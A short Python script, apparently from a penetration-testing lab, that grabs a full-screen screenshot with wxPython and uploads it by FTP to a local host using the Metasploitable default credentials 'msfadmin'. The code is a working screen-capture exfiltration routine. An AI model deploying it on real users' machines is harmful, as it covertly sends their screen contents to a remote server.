"""
1, Grab a screenshot
2, Save it as a PNG file
3, Upload to FTP server
"""

import ftplib
from pathlib import Path

import wx

SCREENSHOT_PATH = Path("grabbed.png")
FTP_HOST = "192.168.0.1"
FTP_USER = "msfadmin"
FTP_PASS = "msfadmin"
FTP_TARGET_PATH = "/tmp/grabbed.png"


def capture_screenshot(output_path: Path) -> None:
    """Capture the full screen and save it as a PNG file."""
    app = wx.App(False)

    screen = wx.ScreenDC()
    width, height = screen.GetSize()

    bitmap = wx.Bitmap(width, height)
    memory_dc = wx.MemoryDC(bitmap)
    memory_dc.Blit(0, 0, width, height, screen, 0, 0)

    del memory_dc  # release device context

    bitmap.SaveFile(str(output_path), wx.BITMAP_TYPE_PNG)
    print(f"[OK] Screenshot saved to {output_path.resolve()}")


def upload_via_ftp(
        local_path: Path,
        host: str,
        username: str,
        password: str,
        remote_path: str,
) -> None:
    """Upload a file to an FTP server."""
    with ftplib.FTP(host, timeout=10) as ftp:
        ftp.login(user=username, passwd=password)

        with local_path.open("rb") as file:
            ftp.storbinary(f"STOR {remote_path}", file)

    print(f"[OK] Uploaded screenshot to ftp://{host}{remote_path}")


def main() -> None:
    try:
        capture_screenshot(SCREENSHOT_PATH)
        upload_via_ftp(
            local_path=SCREENSHOT_PATH,
            host=FTP_HOST,
            username=FTP_USER,
            password=FTP_PASS,
            remote_path=FTP_TARGET_PATH,
        )
    except ftplib.all_errors as exc:
        print(f"[FTP ERROR] {exc}")
    except Exception as exc:
        print(f"[ERROR] {exc}")


if __name__ == "__main__":
    main()
